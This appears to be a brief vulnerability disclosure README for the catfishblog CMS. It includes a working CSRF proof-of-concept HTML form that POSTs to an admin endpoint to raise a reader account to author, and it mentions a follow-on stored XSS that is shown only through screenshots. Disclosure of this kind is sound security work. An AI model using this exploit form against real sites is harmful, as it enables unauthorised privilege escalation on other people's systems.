# catfishblog
## CSRF

Register an account 
![](https://github.com/AvaterXXX/catfish/blob/master/catfishblog/CSRF1.png)
Current permissions are readers
![](https://github.com/AvaterXXX/catfish/blob/master/catfishblog/CSRF2.png)
use poc
```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://10.33.62.73:8080/admin/Index/tiquan" method="POST">
      <input type="hidden" name="id" value="4" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
Permission changed to author
![](https://github.com/AvaterXXX/catfish/blob/master/catfishblog/CSRF3.png)
-----------------
## XSS
Use the account after the privilege,write soucre code
![](https://github.com/AvaterXXX/catfish/blob/master/catfishblog/2.png)
Successfully click on the page 
![](https://github.com/AvaterXXX/catfish/blob/master/catfishblog/4.png)
